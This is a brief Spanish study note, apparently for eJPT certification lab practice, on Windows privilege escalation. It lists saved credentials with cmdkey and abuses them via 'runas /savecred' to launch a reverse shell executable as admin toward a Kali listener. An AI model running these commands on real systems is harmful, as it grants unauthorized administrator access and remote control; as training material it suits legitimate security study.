
- Enumere las credenciales guardadas:

```
cmdkey /list
```
Tenga en cuenta que las credenciales para el usuario "admin" se guardan. Si no lo son, ejecute el script C:\PrivEsc\savecred.bat para actualizar las credenciales guardadas.

- Inicie un oyente en Kali y ejecute el ejecutable reverse.exe usando runas con las credenciales guardadas del usuario administrador:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Passwords - Passing the Hash]]
[[Passwords - Registry]]
[[Passwords - Security Account Manager (SAM)]]
[[Generate a Reverse Shell Executable]]

